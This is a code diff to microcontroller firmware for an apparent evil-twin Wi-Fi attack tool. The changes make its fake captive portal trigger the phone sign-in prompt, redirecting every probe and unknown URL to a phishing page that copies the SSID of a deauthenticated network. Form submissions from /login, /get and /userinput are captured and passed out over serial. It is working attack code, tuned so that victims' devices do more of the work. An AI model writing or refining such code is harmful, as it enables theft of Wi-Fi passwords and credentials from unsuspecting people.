@@ -209,18 +209,35 @@ void destroyAP(){
 }
 
 
-String makeResponse(int code, String content_type, bool compresed) {
-  String response = "HTTP/1.1 " + String(code) + " OK\n";
+String makeResponse(int code, String content_type, bool compresed, size_t content_length) {
+  // Well-formed HTTP is required: Android/iOS captive detection ignores malformed
+  // responses (bare LF, no Content-Length). CRLF + Content-Length mirrors stock 5Ghost.
+  const char *reason = (code == 302) ? "Found" : (code == 404) ? "Not Found" : "OK";
+  String response = "HTTP/1.1 " + String(code) + " " + reason + "\r\n";
   if(compresed)
-  response += "Content-Encoding: gzip\n";
-  response += "Content-Type: " + content_type + "\n";
-  response += "Connection: close\n\n";
+  response += "Content-Encoding: gzip\r\n";
+  response += "Content-Type: " + content_type + "\r\n";
+  response += "Content-Length: " + String(content_length) + "\r\n";
+  response += "Cache-Control: no-store\r\n";
+  response += "Connection: close\r\n\r\n";
   return response;
 }
 
+// 302 to the portal root — this is what makes Android's generate_204 / iOS probes fire the
+// "Sign in to network" flow. Stock 5Ghost uses exactly this; DHCP option 114 is NOT needed.
+void handleRedirect(WiFiClient &client) {
+  String response = "HTTP/1.1 302 Found\r\n";
+  response += "Location: http://192.168.1.1/\r\n";
+  response += "Content-Length: 0\r\n";
+  response += "Cache-Control: no-store\r\n";
+  response += "Connection: close\r\n\r\n";
+  client.write(response.c_str());
+}
+
 void handle404(WiFiClient &client) {
-  String response = makeResponse(404, "text/plain",false);
-  response += "Not found!";
+  String body = "Not found!";
+  String response = makeResponse(404, "text/plain", false, body.length());
+  response += body;
   client.write(response.c_str());
 }
 
@@ -263,7 +280,7 @@ void handleRequest(WiFiClient &client,enum portals portalType,String ssid){
     compresed=true;
   }
   
-  String response = makeResponse(200, "text/html", compresed);
+  String response = makeResponse(200, "text/html", compresed, len);
   client.write(response.c_str());
   
    
@@ -635,12 +652,15 @@ void loop() {
             }
             String path = parseRequest(request);
             Serial.println(request);
-            if(path.startsWith("/generate_204")||path.startsWith("/ncsi.txt")||path.startsWith("/success.html")||path.startsWith("/userinput")||path.startsWith("/login")||path.startsWith("/?")||path.equals("/")||path.startsWith("/get")){
+            // Portal page + form submissions get the HTML; every captive probe
+            // (generate_204, ncsi.txt, success.html, …) and any unknown URL gets a
+            // 302 to the portal root, which is what triggers the Android/iOS sign-in flow.
+            if(path.equals("/")||path.startsWith("/?")||path.startsWith("/login")||path.startsWith("/get")||path.startsWith("/userinput")){
               if (deauth_wifis.size() != 0)
                 handleRequest(client, (enum portals)portal, scan_results[deauth_wifis[0]].ssid);
               else
                 handleRequest(client, (enum portals)portal, "router");
-              if (path.indexOf('?') && (path.indexOf('=') > path.indexOf('?'))) {
+              if (path.indexOf('?') >= 0 && (path.indexOf('=') > path.indexOf('?'))) {
                 String datos = path.substring(path.indexOf('?') + 1);
                 if (datos.length() > 0) {
                   Serial1.print("EV:");
@@ -648,8 +668,8 @@ void loop() {
                 }
               }
           }else{
-            handle404(client);
-          }   
+            handleRedirect(client);
+          }
           break;
 
           }else if(character == '%'){
